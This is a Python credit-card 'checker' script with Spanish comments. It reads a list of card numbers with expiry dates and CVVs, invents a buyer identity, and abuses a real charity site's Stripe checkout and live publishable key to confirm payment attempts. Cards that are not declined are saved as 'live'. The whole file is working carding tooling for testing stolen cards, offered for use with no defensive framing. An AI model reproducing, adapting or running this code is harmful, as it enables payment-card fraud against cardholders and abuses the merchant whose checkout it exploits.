#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#importamos modulos
import requests
import json
import sys
import uuid
import urllib3
from termcolor import colored

#generamos un banner
banner = """
 ,,╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓,
 █████████████████████████████████████████⌐
 ███████████████████▌Queen Bank UWU ▐█████H
 █████████████████████████████████████████H
 █████##########██████████████████████████H
 █████##########██████████████████████████H
 █████##########██████████████████████████H
 █████████████████████████████████████████H
 ████▌5365    9563    3620    3352 ███████H
 █████▓█▓█▓█▓███▓█▓█▓█▓███▓█▓█▓███████████H
 ██████████████████████████  QUEEN  ██████H
 █████▄▄▄▄▄▄▄▄▓████████████  BANK   ██████H
 █████████████████████████████████████████H
 ╙▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀*
"""
#creamos funcion para el checker
def chequeo(cc, mm, yy, cvv):
    #mostramos la CC a usar
    print(colored("Probando CC: ", "blue"), cc, "\n")
    #mostramos en que paso vamos
    print(colored('[+] Paso 1 en proceso....', "yellow"))
    #creamos una cabecera
    head1={
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Pragma':'no-cache',
    'Accept':'*/*',
    }
    #hacemos una solicitud
    response1 = requests.get('https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US',headers=head1).json()
    #mostramos datos
    for x in response1['results']:
        print(colored('[*]Informacion Generada:', "magenta"))
        name=x['name']['first']
        second=x['name']['last']
        email=(name+second+'@outlook.com').lower()
        fullname=name + ' ' + second
        print(colored('[-] Nombre: ', "blue"), name)
        print(colored('[-] Apellido: ', "blue"), second)
        print(colored('[-] Nombre Completo: '), fullname)
        print(colored('[-] Email: ', "blue"), email)
        print(colored('------------------------\n', "magenta"))
        #mostramos en que paso vamos
        print(colored('[+] Paso 2 en proceso....', "yellow"))
        cookies2 = {'content-type':'application/x-www-form-urlencoded',}
        #hacemos una solicitud
        Guid=str(requests.post('https://m.stripe.com/4',headers=head1,cookies=cookies2).text)
        Muid=str(uuid.uuid1())
        Sid=str(uuid.uuid1())
        print(colored('[*]Informacion Generada:', "magenta"))
        print(colored('[-] Guid: ', "blue"), Guid)
        print(colored('[-] Muid: ', "blue"), Muid)
        print(colored('[-] Sid: ', "blue"), Sid)
        print(colored('------------------------\n', "magenta"))
        #mostramos en que paso vamos
        print(colored('[+] Paso 3 en proceso....', "yellow"))
        cookies3 = {
        'content-type':'application/x-www-form-urlencoded',
        'user-agent':'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
        }
        data3={
        'action': 'asp_pp_req_token',
        'amount': '100',
        'curr': 'USD',
        'product_id': '330',
        'quantity': '1',
        'billing_details': {'name':str(fullname),'email':str(email)},
        }
        #hacemos una solicitud
        response3 = requests.post('https://elevatedbygrace.org/wp-admin/admin-ajax.php',data=data3,cookies=cookies3)
        amir=response3.json()
        client=str(amir['clientSecret'])
        pid=str(amir['pi_id'])
        print(colored('[*]Informacion Generada:', "magenta"))
        print(colored('[-] Cliente: ', "blue"), client)
        print(colored('[-] PID: ', "blue"), pid)
        print(colored('------------------------\n', "magenta"))
        #mostramos en que paso vamos
        print(colored('[+] Paso 4 en proceso....', "yellow"))
        data4={
        'save_payment_method':'true',
        'setup_future_usage':'off_session',
        'payment_method_data[type]':'card',
        'payment_method_data[billing_details][name]':fullname,
        'payment_method_data[billing_details][email]':email,
        'payment_method_data[card][number]':str(cc),
        'payment_method_data[card][cvc]':str(cvv),
        'payment_method_data[card][exp_month]':str(mm),
        'payment_method_data[card][exp_year]':str(yy),
        'payment_method_data[guid]':Guid,
         'payment_method_data[muid]':Muid,
        'payment_method_data[sid]':Sid,
        'payment_method_data[pasted_fields]':'number',
        'payment_method_data[payment_user_agent]':'stripe.js%2F3c236fed%3B+stripe-js-v3%2F3c236fed',
        'payment_method_data[time_on_page]':'40371',
        'payment_method_data[referrer]':'https%3A%2F%2Felevatedbygrace.org%2F%3Fasp_action%3Dshow_pp%26product_id%3D330',
        'expected_payment_method_type':'card',
        'use_stripe_sdk':'true',
        'key':'pk_live_Alme0DgBmyGhR4EGURpxR0Xy',
        'client_secret':client,
        }
        cookies4 = {
        'content-type':'application/x-www-form-urlencoded',
        }
        head4={
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '1012',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/v3/controller-52375fd2df5c19565f60d66a345a1bff.html',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
        }
        #hacemos una solicitud
        response4 = requests.post('https://api.stripe.com/v1/payment_intents/'+pid+'/confirm',data=data4,headers=head4,cookies=cookies4).json()
        #verificamos si la CC esta muerta
        if response4['error']['message'] in ['Your card was declined.','Your card has expired.']:
            print(colored("--------CC MUERTA--------", "red"))
            print('[-] Result = '+response4['error']['message'])
            print('[-] Reason = '+response4['error']['decline_code'])
            print(colored("-------------------------\n", "red"))
        #y si no...
        else:
            print(colored("--------CC VIVA---------", "green"))
            print('[+] '+str(cc)+' Valida')
            open('cc_vivas.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n')
            print(colored("-------------------------\n", "green"))
#creamos una funcion principal
def main():
    #mostramos el banner
    print(banner)
    #mostramos formato
    print(colored('Formato: CC|mm|yy|cvv\n\nEjemplo: 5365956336203352|08|2025|152\n', "yellow"))
    #mostramos formato
    print(colored("Guarda las CC en un archivo .txt\n", "yellow"))
    #solicitamo una lista de cc
    CCList=open(input('Archivo .txt con CCs: '),'r').read().splitlines()
    #recorremos las CC
    for i in CCList:
        cc=i.split('|')[0]
        mm=i.split('|')[1]
        yy=i.split('|')[2]
        cvv=i.split('|')[3]
        #tratamos de usar la funcion principal
        try:
            #llamamos a la funcion principal
            chequeo(cc,mm,yy,cvv)
        #en caso de que no...
        except:
            #mostramos un error
            print(colored("Ocurrio un error con la CC{}\n".format(cc), "red"))
            #tratamos de usar la funcion principal
            try:
                #llamamos a la funcion principal
                chequeo(cc,mm,yy,cvv)
            #en caso de que no...
            except:
                #mostramos un error
                print(colored("Ocurrio un error con la CC{}\n".format(cc), "red"))
                #tratamos de usar la funcion principal
                try:
                    #llamamos a la funcion principal
                    chequeo(cc,mm,yy,cvv)
                #en caso de que no...
                except:
                    #mostramos un error
                    print(colored("Ocurrio un error con la CC{}\n".format(cc), "red"))
    #leamos las cc vivas
    with open("cc_vivas.txt", "r") as f:
        vivas = f.read()
        print(colored(vivas, "green"))
#creamos un punto de acceso
if __name__ == '__main__':
    #llamamos a la funcion principal
    main()
